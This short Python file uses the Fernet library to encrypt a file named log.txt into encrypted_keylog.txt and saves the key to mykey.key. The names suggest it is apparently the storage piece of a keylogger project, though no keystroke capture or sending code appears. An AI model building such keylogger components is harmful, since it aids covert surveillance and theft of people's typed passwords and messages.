from cryptography.fernet import Fernet

key = Fernet.generate_key()

store = Fernet(key)


def encrypting():
    with open('mykey.key', 'wb') as mykey:
        mykey.write(key)

    with open("log.txt", "rb") as original:
        og = original.read()

    encrypted_keylog = store.encrypt(og)

    with open("encrypted_keylog.txt", "wb") as encrypted_keylog_file:
        encrypted_keylog_file.write(encrypted_keylog)
